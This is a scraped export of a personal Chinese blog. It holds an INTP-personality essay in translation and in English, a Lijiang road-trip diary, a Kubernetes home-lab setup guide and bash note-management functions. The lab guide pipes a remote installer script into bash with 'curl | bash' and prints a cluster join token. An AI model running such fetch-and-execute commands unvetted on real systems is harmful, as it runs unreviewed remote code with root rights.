则少到 1%，甚至我们的 MBTI 姊妹 INTJ，跟我们相处时有时也会感到怪异。INTJ 没有我们的感知功能，因此，他们凭空创造精神世界。他们思考，然后在现实世界应用他们的理论，INTP 则相反，他们分析世界，然后基于观察构造精神世界。（译者注：说白了，是路径依赖，自己想象不出来，就看看世界有什么特点，总结归纳分析）\n给我看看你的百科全书，然后我也会给你看我的 INTP 很开心地了解世界，填充百科全书，那么我们真正想从他人身上获得的是什么呢？想到了吗？\n我们想分享写百科全书的经历。我们想和他人交流、互相补充、应用百科全书的内容。我们可以在一个努力了解宇宙本质的大社区中分担负担。（译者注：如果信仰不可知，信仰无自由意志，INTP 马上无所事事，可能病就好了。就是因为有错觉，觉得事物是可了解的，世界是可认识的，才会那么孜孜不倦乐此不疲地观察和分析。）我们和其他人的百科全书相似时我们感受到一种连接，大量重合时感受到爱。怎样才能知道达到这点了呢？当我们想和一个人说很多话的时候，有人开始关心我们，他们真的想要呆在我们身边，一起交谈、分享事物。这个时候就找到了亲密的感觉了，是这样的吗？\n很残酷，并不是。\n首先，当这种看起来的兼容性发生时，我们会觉得神奇。我们终于找到了一个百科全书共同作者，组成一个犯罪团伙探索世界的感觉非常棒。稍等一下，异样还是会浮现。也许他们不再想说那么多了，也许他们的渴望消退了，想把百科全书束之高阁了。怎么肥事？这人关心我并且想和我呆在一起，但是为什么呢？这人现在的激情何在？为何我们不再能够共享百科全书了呢？（译注：我们关心世界，不真正关心人。非常自我，又很无我，实在矛盾和荒谬。）\n好吧，你做了个错误假设但自己不知道。别人关心你，有他们自己的原因，但肯定不是因为你以为的原因。这两者可能非常非常不同。这就是 INTP 心中暗涌的来源。当某人想靠近我们，或者我们想靠近某人时，如果没有办法一起写百科全书，心头就会出现微妙的困惑。一个理性人渴望心灵伴侣，我可以做一个思想实验来阐释这个过程。你可以把一个极致美好的女人放在我跟前，当然我会渴望。过去很长一段时间，我以为我的渴望源自她的美丽，但现在我明白并非如此。人们喜欢美好的事物，这没什么稀奇，但这只是发端。在潜意识里，我会预设她的美是由内而外的，她会有和美貌相匹配的思想。如果她没开口，我的幻想就会持续发酵。如果她永不开口，这份幻想就无法证伪，而她将永远美好。一旦她开口，我观察她的行动，如果她的思想让我下头，吸引力就会消失，无论她多美。悲伤的事实是你没办法爱一个不爱思想的人，没法假装。我想说倒过来也成立，无论一个人外貌如何，思想的连接可以激发你对对方的渴望。\n终极解决方案 一旦 INTP 发现别人与我们的思维方式截然不同，并且是被完全不同的动机驱动时，INTP 把分析和理解世界的渴望转移到对人际关系的研究上。然而，人类是非理性的、混乱的、不可预测的，是吧？毫无逻辑。我们在他们身上建立的理论似乎都没有办法完全奏效，所有尝试过的相处路径最终都会偶尔失败。创伤和失败不断增加，你都打算打道回府了。但你的人性实在难以忍受疏离。于是你时不时又想试试。（译注：字字是血，未经痛苦和反复写不出这样的话）\n如果你陷在这个怪圈里面，我要提供一些重要的观点给你。\n准备好了吗？\n事实上，人类，是逻辑的、理性的、可预测的。\n我没瞎说，人确实很复杂，很难应对。但难仅仅意味着难，并非不可能。对我们来说，最难的就是情绪。\n为了更好地理解人，我们 INTP 需要学习一些反本能的东西。\n（1）充分重视情绪对人，以及我们自己，的驱动力\n（2）理解情绪的根因。我们习惯于压制情绪，总是选择合乎逻辑的答案而不是情绪化的答案。其他人格并不这样。在我们成功解构情感的力量之前（包括，尽管我们努力消除情绪，它仍然影响我们，这是如何发生的），我们几乎没有希望成功引导他人的感情。我们没有办法理解其他人行为的含义，更无法进行预测。\n至于具体怎么做，那就是另一个主题了，留待来日再谈。\nChapter 1: Why Do I Feel Disconnected?（原文） (WHAT\u0026rsquo;S NEW: 10/23/15\u0026ndash;I\u0026rsquo;ve been away for a good bit grappling with new challenges and the next stage of life struggles. But I\u0026rsquo;m coming back with a new article, and a new idea! It\u0026rsquo;s about the INTP drive for creation and achievement. Along with the new article, I\u0026rsquo;d like to create a page dedicated to INTPs supporting other INTPs in business. If you need a product or service, why not go to another INTP?? You know will get a person who understands your approach to the world!)\nWelcome to the first of what will hopefully become a series of articles wrestling with the nature of INTP-dom. (I could say INTP-ness, but that sounds somehow naughty.) When I read conversations posted among INTPs, I notice a curious and common undercurrent. Sometimes it\u0026rsquo;s the outright subject of the conversation, and sometimes it hovers just beneath. It\u0026rsquo;s an undercurrent of feeling disconnected, different, and isolated from others.\nI\u0026rsquo;ve also noticed that analyzing and understanding the source of this particular problem seems to be elusive for INTPs. Although we define ourselves by our ability to apply logic and structure to understand and navigate the world, this problem seems to hide just beyond our perception. Every time we get close to grasping it, it slips through our fingers. In fact, we have a hard time even successfully defining the boundaries of the problem, much less discovering the ultimate solution.\nNever one to shy away from the hard topics, I\u0026rsquo;m going to begin my INTP series with an exploration of this conundrum. How does our INTP nature react with the personalities of others in a way that leads us to feel this odd, hard-to-define isolation?\nFirst of all, you\u0026rsquo;ll notice I said feel. As we know, the entire subject of feelings is a squirrely topic for INTPs. The introverted feeling cognitive function is in the shadow position for us. That\u0026rsquo;s the ability to build a clear, persistent sense of who we are as people based on how we feel about ourselves. We are driven by thinking rather than feeling. For example, if our understanding of the world leads us to the conclusion that we are an X kind of person, then that means we\u0026rsquo;re an X kind of person. Our feelings will then follow that decision. If later, we gain evidence that we are a Y kind of person, then we are a Y kind of person, and our feelings will follow again. It\u0026rsquo;s that easy to change our self-identity. We don\u0026rsquo;t have the natural ability to \u0026ldquo;just know\u0026rdquo; the kind of person we are. We look for evidence of who we are, then make a decision based our on analysis. This process can be dangerous, however, if jarring, paradigm-changing evidence hits us too often. Our lives can be turned upside down by it. There certainly can be value in having a strong emotional anchor to us through storms and rough water. As INTPs, we can get blown onto the rocks.\nBecause our own emotions are suspect and we minimize their importance, we fail to understand the importance, influence, and changeability of emotions in others. Our extroverting feeling function is in the inferior position, so it develops last. Basically, when we\u0026rsquo;re young, our rationality bullies our emotions into a tightly controlled box, and when they erupt, they\u0026rsquo;re frightening, exaggerated, and uncontrolled. As we age, however, we can build up our feeling skills. It\u0026rsquo;s a painful, uncomfortable process, but slowly we can learn from mistakes and observations about ourselves and others. After years of struggling yet maintaining a fierce effort to analyze and understand, I now feel that at the age of 41, I can offer some potential insights into where we fit in the social landscape. These are kinds of insights I would have liked to have available to me when I was a young INTP.\nThe Hardest Feeling for Anyone to Quantify: Feeling \u0026ldquo;Normal\u0026rdquo; The most difficult kind of self-awareness is understanding exactly what constitutes \u0026ldquo;normal\u0026rdquo; in our daily existence. For example, you don\u0026rsquo;t really think about the many nuances of breathing. It just comes naturally most of the time. You only become aware of breathing when it is not normal. That\u0026rsquo;s when stronger feelings are evoked, and you have a biologically-programmed reason to remember. For example, you remember being short of breath, you remember choking, but you don\u0026rsquo;t remember the last five minutes of breathing right now.\nBiologically, we remember the horrible things the most, the great things second, and the \u0026ldquo;normal\u0026rdquo; things least of all. Actually, it\u0026rsquo;s an effective method of survival. First rule: don\u0026rsquo;t get hurt or killed. Second rule: get the good stuff and enjoy it. Third Rule: do all the boring stuff in between. The challenge is digging out of the mental complacency of normal to make sharp observations. It\u0026rsquo;s easy to see the friction points. It\u0026rsquo;s hard to deconstruct the nuances of each step when you\u0026rsquo;re flying on autopilot.\n\u0026ldquo;Breathing\u0026rdquo; for an INTP When an INTP wakes up to a new day and walks out the front door, what is the INTP revved up to do? What\u0026rsquo;s our \u0026ldquo;thing?\u0026rdquo; What do we do like breathing?\nSome personality types are honed, practiced, and pumped up to enforce the RULES. They\u0026rsquo;re the Guardians. Some are eager to see what the day brings and find opportunities to have a GREAT TIME. They\u0026rsquo;re the Artisans. Some are primed to reach out with their hearts and find MEANING IN THE WORLD. They\u0026rsquo;re the Idealists. INTPs, on the other hand, are one of the Rational types. INTPs are primed, practiced, and ready to identify, analyze, understand, and then predict the workings of the world.\nIt\u0026rsquo;s an internal, individualized, mental process. Basically, the INTP spends every day gathering information and fitting it into a sweeping, growing, and universal body of understanding of…everything. It could be cloud formations, what makes wind, traffic patterns, cooking styles, kangaroos, bad breath, brain chemistry, overgrown toenails, politics, arguments, star formation, how grass grows, or whether you need to put cream on that weird rash. The topics, however, are less important than the process itself. If we observe X situation undergoing Y action causing Z result, we remember that. If we observe it again, we remember we\u0026rsquo;ve seen the same evidence twice. If we observe it a third time, we may decide that we have discovered a potential Truth (that is, something we believe to be true until new information suggests that it requires modification). Each Truth becomes a predictor. If we observe X situation undergoing Y action again, then we can expect the Z result. If we are correct in predicting Z, then we really start feeling awesome. That feels right. That feels normal.\nWhen we have amassed enough Truths to predict a lot of things, we begin to get noticed by the people around us. We begin to seem insightful, wise, and almost psychic at times. When I was young, I could often predict a person\u0026rsquo;s entire point after hearing the first few words of their sentence. When I would answer their question or react to their point correctly, their jaw would drop. The prediction was the result of the sum of my knowledge of the person, my knowledge of prior conversations, what just happened that might have sparked a certain thought in their head, and the verbal cues pointing to where the conversation is about to go. Again, a successful prediction equates with understanding, and that feels good to an INTP.\nThis drive to amass information, form structures, and predict the world permeates everything an INTP does. To many people, what I just explained sounds exhausting at best, or pathological at worst. But if you\u0026rsquo;re an INTP, I trust this process happens like breathing. You might not even be aware that you\u0026rsquo;re doing it. This process is the way we make sense of the world and find our place within it. It makes us feel at ease, controlled, and calm.\nThe Handy-Dandy INTP Supercalifragilistic Encyclopedia So, in a way, an INTP is handed a huge, blank encyclopedia at birth, and the INTP\u0026rsquo;s life is spent filling it up. And not from beginning to end. All sorts of points will be hit in the middle, and the knowledge spreads out from there. If you\u0026rsquo;re really lucky, by the end of your life, most of the empty spaces will be filled in.\nEach day, the INTP walks around with this encyclopedia always at hand, always ready to record a new insight, make a revision, or use it to predict what is likely about to happen. It can also be whipped out at parties to spark interesting conversation or to twist it into humor. INTPs can be charming and charismatic, providing endless entertainment for those who love trivia, philosophy, or other off-the-wall conversation.\nDid you hear that word I slipped in there INTPs?\nEntertainment.\nYeah, I said it. If you have a decently-sized encyclopedia, you probably know what I\u0026rsquo;m talking about all too well. But feeling like the entertainment can piss you off after a while. It\u0026rsquo;s divisive. When you go to see a show, there\u0026rsquo;s an audience and a stage, and those two groups of people don\u0026rsquo;t mix. The audience just wants their laughs when they want them, then go home. It\u0026rsquo;s the Nirvana effect: here we are now, entertain us.\nINTPs use charm and humor and conversation as a tactics to draw people closer and to have social interaction. If you\u0026rsquo;re older, you\u0026rsquo;ve probably learned by now that, in the end, it doesn\u0026rsquo;t work. We fail to gain the closeness we\u0026rsquo;re craving. Instead, we\u0026rsquo;re directed to exit stage door left when the show is over.\nYet, we use our encyclopedias this way because we really don\u0026rsquo;t know what else to do. It\u0026rsquo;s our way of feeling out other people. Are they interested in what\u0026rsquo;s going on in our heads? Are they interested in our observations and understandings? Do they have similar thoughts? Can I help them with what I\u0026rsquo;ve learned? Can they help me?\nHumor can be a very powerful tool in reaching out. It often requires intelligence. It\u0026rsquo;s an indicator. Does the other person get it? Can they follow the humor? Can they reciprocate? That\u0026rsquo;s the plan, at least. But when the attempt doesn\u0026rsquo;t click, that\u0026rsquo;s when we\u0026rsquo;re either rejected as a geek/freak, or we get hired as the entertainment. For those of you who have been the night\u0026rsquo;s feature presentation, it can be cool. But another part of you says SCREW THAT. If you\u0026rsquo;re going to be used and dismissed, the least they can do is pay you well for it. Am I right?\nHello? Is Anybody Out There Hearing Me? So why do we have this recurring feeling that we\u0026rsquo;re not jiving with people? Why is it hard to get close to someone? And why is it that once we do seem to get close, it tends to erode and disintegrate?\nOn the one hand, the reason is terribly simple. What is not simple is the subtle mental and emotional chemistry that goes on within us that results in those hard-to-navigate feelings. After all, no person makes us feel anything. We are the reason we feel something. All feelings come from within us. The other person is just the target that we are hanging our emotions onto. We can just as easily hang them on someone else.\nSo, let\u0026rsquo;s turn back to what is normal for an INTP. That is where the problem lies. We may not even realize we\u0026rsquo;re toiling away at our encyclopedias. We just do it. And like all people, we innately assume that everyone thinks and does the same things we do. Why would we believe any differently? We all follow the golden rule: if we treat others how we want to be treated, they will reciprocate. Right?\nNo. Unfortunately, they often don\u0026rsquo;t.\nThey are following the golden rule also, but their version of it. They often want something fundamentally different. As you try to provide one thing, they are hoping to receive something else, and vice versa.\nINTP\u0026rsquo;s are well under 2% of the population. If you are INTP female, you are well under 1% of the population. Even our close rational cousins, the INTJs, feel somewhat alien when we interact with them. INTJs do not share our Perceiving function, and, therefore, they can create their mental constructs in a vacuum. They tend to think it first, then go about putting their theories into practice in the world. INTPs do it in the opposite direction. They observe and analyze the world first, then go back and create constructs based on what we observed.\nI\u0026rsquo;ll Show You Mine If You Show Me Yours Here you are, an INTP happily working away on your encyclopedia and figuring out the world. So, what do we ultimately want from other people?\nYou see it coming, right?\nWe want to share the experience of writing our encyclopedias. Want to share pages, compare notes, help others predict and avoid bad stuff and mistakes, and get others\u0026rsquo; insights so we can avoid some bad stuff ourselves (especially icky emotional badness). That way, we don\u0026rsquo;t have learn everything the hard way. We can share the load in a grand community striving to understand the nature of the universe. We feel connected to people when they seem like they might have a similar encyclopedia. We feel love when the overlap seems especially potent. How do we know? When we want to talk with a person more, more, more. Then, it happens. Someone starts to care for us. They actually want to be around us and talk and share things. MISSION ACCOMPLISHED! Right??\nWrong again. (I know I’m being hard on you.)\nAt first, when this seeming compatibility happens, it feels AMAZING. We have finally found an encyclopedia co-author. It\u0026rsquo;s so much more fun to tear into the world with a partner-in-crime. But wait a minute. Little clinkers start happening. Maybe they don\u0026rsquo;t want to talk so much anymore. Maybe their eagerness wears off, and they are happy to put their encyclopedia on the shelf. You think, WTF? This person cares and wants to be with me, but why? What is still fueling the person\u0026rsquo;s interest? Why can\u0026rsquo;t we share encyclopedias anymore?\nWell, you have made a mistake in your assumption and you don\u0026rsquo;t know it yet. Another person will care for you for their reasons, not yours, and the two may be very, very different. Here is the source of the INTP undercurrent. It\u0026rsquo;s the subtle confusion that arises when someone wants to be with us, or we want to be with them, and yet they aren\u0026rsquo;t really jiving on the encyclopedia level. A rational craves a mindmate, and here\u0026rsquo;s an example of what that means. You can put an insanely gorgeous woman in front of me, and, of course, I\u0026rsquo;ll feel desire. For a long time, I thought I would desire her because she was beautiful, but I\u0026rsquo;ve learned that\u0026rsquo;s not true. Everyone likes what we find beautiful, that\u0026rsquo;s no secret, but it\u0026rsquo;s just a start. Without realizing it on a conscious level, I would fantasize that her beauty is an indication that her mind is going to match that attractiveness. If she hasn\u0026rsquo;t opened her mouth yet, the fantasy can grow. If she never opens her mouth, that fantasy can become a false truth. She can remain utterly amazing forever. However, if she does open her mouth, or I can observe her actions, something often happens. If her mind turns out to be a turn-off, the attraction will evaporate, regardless of her beauty. Honestly. The sad truth is that I don\u0026rsquo;t think there\u0026rsquo;s a double-bagger solution for anti-mindmates. It\u0026rsquo;s not something that can be ignored. (I should note that the reverse is also true. Mind connections can spark desire regardless of a person\u0026rsquo;s appearance.)\nThe Final Solution Once an INTP discovers the shocking truth that other people think very differently than we do and are driven by very different motivations, the INTP then turns the overall desire to analyze and understand the world onto to the inner workings of people themselves. However, people are irrational, chaotic, and unpredictable, right? Not logical at all! Every theory we make about them seems to fall apart. Every safe path we chart through them leads to swamps and disasters. The traumas mount. And the failures. You might even decide to take your ball and go home. But it\u0026rsquo;s just against human nature to enjoy isolation. You keep limping back and trying to connect again.\nIf you\u0026rsquo;re stuck in this cycle, then I have an important insight for you.\nReady for it?\nPeople, in fact, are entirely logical, rational, and predictable.\nNo, no, I\u0026rsquo;m not smoking something. The human condition is indeed extraordinarily complex and challenging to tackle, but as you well know, hard doesn\u0026rsquo;t mean impossible. Hard just means hard, and what makes it the toughest for us is the element of emotion.\nHere are the unnatural things that we INTPs have to learn to do in order to better understand people: (1) give adequate weight to the motivating power of emotion in other people (and ourselves) and (2) understand the roots of that emotion. We stomp down emotion and will always choose a logical answer over an emotional one. Most of the other personality types are not that way, however. Until we successfully deconstruct the power of emotion (including how it still affects us despite our efforts to kill it), we have little hope of successfully navigating emotions in others. We will not be able to understand what the actions of other people mean and how to predict them.\nBut that process, my friends, will need to be a topic for another day.\n","permalink":"https://ret2neo.cn/mind/221022-intp-series-1/","summary":"本文译自：http://www.intpexperience.com/Isolation.php\n域名已过期，可以使用cache查看：https://web.archive.org/web/20230219221929/www.intpexperience.com/Isolation.php\n第一章：为何我感到疏离？（译文） 当我阅读 INTP 们的对话，我发现一种奇特的共性，INTP 们感到自己和他人疏离、不同、缺少连接。\n我还注意到分析和理解清楚这个问题的根因对 INTP 们来说不容易。尽管我们擅长通过应用逻辑和结构化思维来理解和探索世界，但这个问题看起来超出我们的洞察力范围了。每次当我们快抓住它的时候，它就从指间溜走。事实上，我们甚至很难成功定义这个问题的边界，更别提发现终极解决方案了。\n迎难而上，我决定从探索这个难题开始 INTP 系列文章。我们的 INTP 本质应对其他个体的方式究竟是如何使我们感受到这种奇怪而难以定义的疏离呢？\n首先，请注意我说的是“感受”。众所周知，INTP 在整个和感情有关的问题上都是苦手。我们的内向感觉认知功能很菜，这是一种根据我们对自己的感觉，建立起一种清晰、持久的自我认同的能力。我们是被思考而不是情绪驱动的。举例来说，如果我们对世界的理解将我们引向一个结论：我们是 X 类型的人，那就意味着我们会认为自己就是 X 类型的人。我们的感觉会追随这个思考做出的决定。如果随后，我们又找到自己是 Y 类型人的证据，然后我们就会认为自己是 Y 类型人，对自己的感觉总会跟着思考的结果走。我们的自我认同就是这么容易发生改变。我们没有那种天生就知道自己是哪种类型的人的能力，我们为自己是谁寻找证据，然后基于分析决定自己是谁。如果自我认同频繁改变，就会有点危险，生活可能因此发生巨变。在生活的风浪中航行，有强大的情感作为锚固是有益的，不然 INTP 很容易被吹到礁石上。\n因为我们自己的情绪显得可疑，并且我们总是忽视它，所以我们难以理解，在他人身上情绪的重要性、影响力和可变性。我们的外向感觉功能处于劣势，所以他们最后发展。总的来说，当我们年轻的时候，理性强烈压制着情绪，当情绪爆发的时候，它们是可怕夸张而不受控的。伴随着成长，我们会锻炼自己的感觉能力，这是个痛苦不适的过程，我们从犯错、从对自我和他人的观察中学习和成长。经过年复一年的自我挣扎，漫长而艰辛的试图分析与理解，年逾不惑的我觉得自己可以给年轻的 INTP 们提供一些关于如何在社会中立身的见解了。\n任何人最难量化的感觉：感觉“正常”。 最困难的一种自我意识是准确理解我们日常生活中的“正常”是怎样的。例如，你并没有真正考虑呼吸的许多细微差别，大部分时候呼吸都很自然地发生。只有当呼吸不正常的时候你才会意识到它。当更强烈的感受被激发时，你的生物本能会让你记住。比如你会记得窒息，但不会记得过去五分钟的呼吸。\n生物层面，我们对可怕的事物印象最深，然后是美妙的事物，最后才是正常的事物。事实上，这是生存的有效策略。法则一，别受伤或死掉。法则二，找到好东西并享受。法则三，时不时干点无聊的事情。挑战在于跳出习以为常进行敏锐的观察。注意到异常点是容易的，在惯性行为中解构每个步骤的细节是困难的。\n对 INTP 来说像“呼吸”一样正常的事情。 当 INTP 醒来开始新的一天，走出门时，什么是自然而然，会像呼吸一样去做的事情呢？\n有些人格类型经过磨炼、练习和激发来增强规则，他们是守护者。有些渴望看到每天会发生什么并寻找机会来度过好时光，他们是工匠。有些沉迷于寻找意义，他们是理想主义者。INTP 是其中之一。INTP 时刻准备着识别、分析理解和预测世界的运作方式。\n这是一个内在的、个人化的精神世界的过程。总体上，INTP 每天收集信息信息，将他们放进一个全面的、不断发展的关于一切的认知体系当中。信息可以是关于任何事物的，这个过程本身比关注的主题更重要。如果我们观察到 X 情况下 Y 行为会导致 Z，我们会记住这一点。如果我们又观察到，我们会记住已经见过两次这个证据。如果我们第三次观察到，我们可能决定自己发现了一个潜在真理（除非将来出现新的信息证明这个结论需要修正，否则这是一个真理）。每个真理都是一个预测器。如果在见到 X 条件下发生 Y 行为，我们就可以期望 Z 结果。如果我们成功地正确预测了 Z，我们就会觉得很棒。这带来一种正确、正常的感觉。\n当我们积累了足够多的真理来预测很多事情时，周围人就会注意到我们。我们会看起来有洞见、有智慧，甚至有时候能通灵。当我年轻时，我常常能听一个人说几句话就猜到他的观点。当我能够正确回答他们的问题或者对他们的观点做出反应时，他们会惊掉下巴。预测源于我对这个人的了解，对先前对话的了解，刚发生的可能触发他们想法的事件，暗示对话发展方向的词汇 。完成一次成功的预测就像是完成了理解，这对 INTP 来说很棒。\n这种收集信息、形成结构和预测世界的动力渗透到 INTP 所做的一切事情中。对大多数人来说，我刚才描述的事情听起来精疲力竭，甚至有些病态。但如果你是 INTP，我相信这个过程对你就像呼吸一样自然。你甚至意识不到自己在这样做。这个过程是我们在世界上寻找意义和自我定位的方式，这让我们感到放松，有控制感和冷静。\nINTP 的百科全书 某种意义上，INTP 出生时就带来一本空白的百科全书，INTP 们终其一生就是为了填满这本书。不是从头到尾填的，而是东一笔西一笔旁逸斜出地填，最终如果足够幸运，在人生尽头大部分空白会被填满。","title":"【翻译】INTP 系列一：疏离"},{"content":" 夜宿来宾，风声不绝，略记近日。\n一年一度，我又来到了丽江。\n这回还途经了广东湛江，云南文山、昆明、大理、曲靖，广西来宾，七日疾驰近五千公里，意犹未尽。\n在湛江见到了军港，吃到了芥末味的串，大雨比那啥那天还大，凌晨三点才到酒店，大约是这晚开始，我不再是个新司机了。\n文山富宁平平无奇，像极了家乡的小县城。\n大理的路虽不行，海却不错，怪不得不少706的朋友愿意常呆此处。行程比较紧没有拜访大理706是个遗憾，有机会再来。另外下车拍照时偶遇广西而来的骑士，我总是欣赏不合俗流的人。\n洱海和小五。\n看起来很棒的房车。\n云杉坪对于见惯森林的我来说平平无奇，蓝月谷也没有初见时惊艳，但在雪山脚下宽敞的道路上飞驰让我感到放松自在，心旷神怡。\n白沙古镇不大，但逛着总有惊喜。这里有一切皆可藏身的“一藏”，雪山脚下的咖啡馆“米良”，“不二”，“无尘”，“无我非空”，“善哉”，这儿可能没有乔达摩，但大约藏着不少悉达多。\n曲靖外滩烟火气十足，“云南人家”的美味是此行的意外之喜，买了十元体育彩票中了二十元最后又输光，不过是一场空。\n旅途大约是有惊无险，感谢超贤老司机的指点和同行小伙伴们的照顾，对我来说，独行还是很容易打退堂鼓，断然不会走这么远。\n最后顺便，诚招旅行伙伴，一同周游列省，游历更多城市，完成问界百城计划。老司机优先（一人日行八百真的会腻），直觉型优先（本人INTP岔道常常选错路口），开朗聪明的姑娘优先。\n注：本文照片由Magic系列拍摄。\n","permalink":"https://ret2neo.cn/mind/221007-lijiang-travel/","summary":"夜宿来宾，风声不绝，略记近日。\n一年一度，我又来到了丽江。\n这回还途经了广东湛江，云南文山、昆明、大理、曲靖，广西来宾，七日疾驰近五千公里，意犹未尽。\n在湛江见到了军港，吃到了芥末味的串，大雨比那啥那天还大，凌晨三点才到酒店，大约是这晚开始，我不再是个新司机了。\n文山富宁平平无奇，像极了家乡的小县城。\n大理的路虽不行，海却不错，怪不得不少706的朋友愿意常呆此处。行程比较紧没有拜访大理706是个遗憾，有机会再来。另外下车拍照时偶遇广西而来的骑士，我总是欣赏不合俗流的人。\n洱海和小五。\n看起来很棒的房车。\n云杉坪对于见惯森林的我来说平平无奇，蓝月谷也没有初见时惊艳，但在雪山脚下宽敞的道路上飞驰让我感到放松自在，心旷神怡。\n白沙古镇不大，但逛着总有惊喜。这里有一切皆可藏身的“一藏”，雪山脚下的咖啡馆“米良”，“不二”，“无尘”，“无我非空”，“善哉”，这儿可能没有乔达摩，但大约藏着不少悉达多。\n曲靖外滩烟火气十足，“云南人家”的美味是此行的意外之喜，买了十元体育彩票中了二十元最后又输光，不过是一场空。\n旅途大约是有惊无险，感谢超贤老司机的指点和同行小伙伴们的照顾，对我来说，独行还是很容易打退堂鼓，断然不会走这么远。\n最后顺便，诚招旅行伙伴，一同周游列省，游历更多城市，完成问界百城计划。老司机优先（一人日行八百真的会腻），直觉型优先（本人INTP岔道常常选错路口），开朗聪明的姑娘优先。\n注：本文照片由Magic系列拍摄。","title":"2022国庆游记"},{"content":"安装一台Ubuntu 下载地址\n1 http://releases.ubuntu.com/16.04/ubuntu-16.04.7-desktop-amd64.iso.torrent 使用VMware安装一台Ubuntu，修改用户名，重启，然后安装必要工具\n1 sudo apt install -y openssh-server net-tools vim curl 添加公钥之后（不需要重启SSH服务）就可以SSH登录了。\n在机器上面安装docker\n1 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 在机器上面安装kubeadmin\n1 2 3 curl -s https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - echo \u0026#34;deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main\u0026#34; \u0026gt; /etc/apt/sources.list.d/kubernetes.list apt update -q \u0026amp;\u0026amp; apt install -y apt-transport-https kubelet kubeadm kubectl 关闭SWAP并重启\n1 2 3 4 5 6 7 8 永久关闭swap sed -i \u0026#39;/swap/ s/^/#/\u0026#39; /etc/fstab reboot -h now --- 临时关闭，重启失效swapoff -a 永久关闭 注释/etc/fstab中swap相关的那一行 不关闭但设为0 echo \u0026#34;vm.swappiness = 0\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf \u0026amp;\u0026amp; sysctl -p 创建三份克隆 在VMware中 安装一台后，创建两个完整克隆，得到三个VM，分别命名为km ，kn1和kn2作为k8s集群的一主两从。\n初始化master 在作为master的节点上初始化k8s master\n1 2 3 4 5 6 7 kubeadm init -v5 --apiserver-advertise-address 192.168.175.134\\ --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers \\ --kubernetes-version 1.21.0 \\ --pod-network-cidr 10.244.0.0/16 \\ --upload-certs // kubeadm init --apiserver-advertise-address 192.168.175.134 --pod-network-cidr 10.244.0.0/16 --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers 如果拉取镜像出现错误\n1 …… coredns:v1.8.0: output: Error response from daemon …… 使用以下方式解决报错，解决后重新执行上面的初始化。\n1 2 3 4 手工拉取镜像，手动打tag docker pull coredns/coredns docker tag coredns/coredns:latest registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:v1.8.0 docker rmi coredns/coredns:latest 在master上初始化kubectl\n1 2 3 mkdir -p $HOME/.kube cp -i /etc/kubernetes/admin.conf $HOME/.kube/config chown $(id -u):$(id -g) $HOME/.kube/config 在master上安装Pod网络\n1 2 curl https://docs.projectcalico.org/manifests/canal.yaml -O kubectl apply -f canal.yaml 初始化node 在两个node节点运行命令加入集群\n1 kubeadm join 192.168.175.134:6443 --token xn9qv7.rppl8zj7mayci5ee --discovery-token-ca-cert-hash sha256:95dcb2bf32a5738346b91a9a7f13a2d1167d695fede53a22a0184a39e96a1be4 其他优化 在使用kubectl的节点设置自动补全\n1 echo \u0026#34;source \u0026lt;(kubectl completion bash)\u0026#34; \u0026gt;\u0026gt; ~/.bashrc ubuntu16.04设置固定IP\nvim /etc/network/interface\n1 2 3 4 5 6 7 auto ens33 iface enp4s1 inet static address 192.168.175.134 netmask 255.255.255.0 gateway 192.168.175.1 dns-nameserver 114.114.114.114 dns-nameserver 8.8.8.8 service networking restart 测一下配置对不对，reboot生效。没加gateway/dns可能ping不通外网，可以先dhclient。\n","permalink":"https://ret2neo.cn/post/220915-build-k8s-lab-locally/","summary":"安装一台Ubuntu 下载地址\n1 http://releases.ubuntu.com/16.04/ubuntu-16.04.7-desktop-amd64.iso.torrent 使用VMware安装一台Ubuntu，修改用户名，重启，然后安装必要工具\n1 sudo apt install -y openssh-server net-tools vim curl 添加公钥之后（不需要重启SSH服务）就可以SSH登录了。\n在机器上面安装docker\n1 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 在机器上面安装kubeadmin\n1 2 3 curl -s https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - echo \u0026#34;deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main\u0026#34; \u0026gt; /etc/apt/sources.list.d/kubernetes.list apt update -q \u0026amp;\u0026amp; apt install -y apt-transport-https kubelet kubeadm kubectl 关闭SWAP并重启\n1 2 3 4 5 6 7 8 永久关闭swap sed -i \u0026#39;/swap/ s/^/#/\u0026#39; /etc/fstab reboot -h now --- 临时关闭，重启失效swapoff -a 永久关闭 注释/etc/fstab中swap相关的那一行 不关闭但设为0 echo \u0026#34;vm.","title":"k8s集群实验环境搭建"},{"content":"将以下命令加入 ~/.bashrc 文件，或者加入自定义的~/config/mybashrc 文件后再在~/bashrc中执行source ~/config/mybashrc 。\n（使用前需配置blog_path路径和typora路径，配合WSL食用效果更佳）\n1 2 3 4 5 6 7 8 alias update_mybashrc=\u0026#34;source /home/bob/.automan/mybashrc\u0026#34; # 博客相关功能，增删改查 blog_path=\u0026#39;/mnt/d/typote/note/neokb/blog\u0026#39; # 从编号100开始，逐个递增，每次新建会取当前最大的值加一，上限999 function yblog_new(){ touch $blog_path/100.md; echo $1 \u0026gt; $blog_path/$(($(ls $blog_path/*.md | grep -Po \u0026#34;\\d{3}(?=.md)\u0026#34;|sort -r|head -n1) +1)).md; } function yblog_del(){ rm -i $blog_path/$1.md; } function yblog_open(){ cd $blog_path; \u0026#39;/mnt/c/Program Files/Typora/Typora.exe\u0026#39; $1.md; cd -; } function yblog_list(){ for i in $(ls $blog_path/*.md);do echo $i |grep -Po \u0026#34;\\d{3}(?=.md)\u0026#34;|tr \u0026#34;\\n\u0026#34; \u0026#34;\\t\u0026#34;;head -n1 $i|tr -d \u0026#34;\\n\u0026#34;;echo \u0026#34;\u0026#34;;done } 可以查询、删除已有的笔记，指定主题新建一个笔记，也可以指定编号用typora打开对应的文件。\n便捷之处在于不用每次新建笔记时都考虑叫什么名字，还可以和其他bash小工具联动。\n需要注意的是笔记的第一行作为主题，正式笔记从第二行开始。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 bob@pb:~$ yblog_list 100 开天辟地 101 102 bash常见用法 103 golang常见用法 104 python常见用法 105 java常见用法 106 